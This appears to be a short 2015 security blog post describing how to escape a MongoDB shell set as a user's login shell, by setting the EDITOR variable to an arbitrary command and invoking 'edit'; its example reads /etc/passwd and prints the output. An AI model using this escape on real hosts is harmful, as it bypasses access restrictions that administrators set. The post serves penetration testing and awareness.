---
layout: post
title:  "Mongo Shell escape"
date:   2015-06-15 14:16:39
categories: security mongodb
---
Mongo provides a native shell for interacting with local and remote MongoDB instances. In rare cases you may find that a user's logon shell has been replaced with this Mongo shell, this could happen when there is a shared machine where you want developers/admins to access the database but not have native access to the host. Everytime the user logs in, they hit the mongo shell, can execute mongo db commands and thats it.. right? Not quite. 

The Mongo shell allows external editors to be used when editing script files. To define the external editor simply change the environment variable "EDITOR". This provides us with the opportunity to escape the restricted mongo shell and get local access on the host.

{% highlight bash %}
$ mongo
MongoDB shell version: 2.6.9
connecting to: test
> EDITOR="/bin/cat /etc/passwd"
> edit x
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
..<SNIP>..
{% endhighlight %}

A very simple escape and unlikely that you'll ever run into this. But if you do, well now you can get command execution where you shouldn't.

